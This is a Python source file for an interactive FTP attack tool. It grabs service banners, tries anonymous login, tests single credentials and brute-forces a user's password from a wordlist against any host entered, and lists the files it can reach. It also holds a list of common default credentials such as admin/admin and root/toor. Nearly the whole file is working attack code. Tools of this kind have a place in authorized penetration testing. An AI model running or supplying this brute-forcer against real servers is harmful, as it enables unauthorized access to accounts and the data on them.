import socket
from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt

console = Console()

WORDLIST_PATH = Path("wordlists/passwords.txt")

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", ""), ("admin", "password"),
    ("root", "root"), ("root", ""), ("root", "toor"),
    ("user", "user"), ("guest", "guest"), ("anonymous", "anonymous"),
    ("ftp", "ftp"), ("test", "test"),
]


def _load_passwords():
    if WORDLIST_PATH.exists():
        with open(WORDLIST_PATH, encoding="utf-8") as f:
            return [w.strip() for w in f if w.strip() and not w.startswith("#")]
    return []


def grab_banner(host, port=21, timeout=5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        return banner
    except Exception as e:
        return f"error: {e}"


def try_anonymous(host, port=21):
    try:
        from ftplib import FTP
        ftp = FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login("anonymous", "anonymous")
        files = ftp.nlst()
        ftp.quit()
        return True, files
    except Exception as e:
        return False, str(e)


def try_login(host, user, password, port=21):
    try:
        from ftplib import FTP
        ftp = FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        files = ftp.nlst()
        ftp.quit()
        return True, files
    except Exception as e:
        return False, str(e)


def brute_force(host, user, port, passwords):
    """try each password in the wordlist for a given user"""
    for i, password in enumerate(passwords, 1):
        ok, info = try_login(host, user, password, port)
        if ok:
            return True, password, info
        if i % 50 == 0:
            console.print(f"[dim]tested {i}/{len(passwords)}...[/dim]")
    return False, None, None


def run():
    console.print("[cyan]ftp helper[/cyan]")
    console.print("1. Banner grab")
    console.print("2. Anonymous login")
    console.print("3. Single credential test")
    console.print("4. Brute force with wordlist")
    choice = Prompt.ask("choice", default="1")

    host = Prompt.ask("host")
    port = int(Prompt.ask("port", default="21"))

    if choice == "1":
        console.print(grab_banner(host, port))

    elif choice == "2":
        ok, info = try_anonymous(host, port)
        if ok:
            console.print(f"[green]anonymous login OK[/green]")
            for f in info[:50]:
                console.print(f"  {f}")
        else:
            console.print(f"[red]anonymous failed: {info}[/red]")

    elif choice == "3":
        user = Prompt.ask("user")
        password = Prompt.ask("password")
        ok, info = try_login(host, user, password, port)
        if ok:
            console.print(f"[green]login OK[/green]")
            for f in info[:50]:
                console.print(f"  {f}")
        else:
            console.print(f"[red]login failed: {info}[/red]")

    elif choice == "4":
        user = Prompt.ask("user")
        passwords = _load_passwords()
        if not passwords:
            console.print(f"[red]{WORDLIST_PATH} not found or empty[/red]")
            return
        console.print(f"[cyan]testing {len(passwords)} passwords for user '{user}'[/cyan]")
        ok, pwd, info = brute_force(host, user, port, passwords)
        if ok:
            console.print(f"[green]FOUND: {user}:{pwd}[/green]")
            for f in info[:30]:
                console.print(f"  {f}")
        else:
            console.print(f"[red]no password found in wordlist[/red]")

    else:
        console.print("[red]invalid choice[/red]")
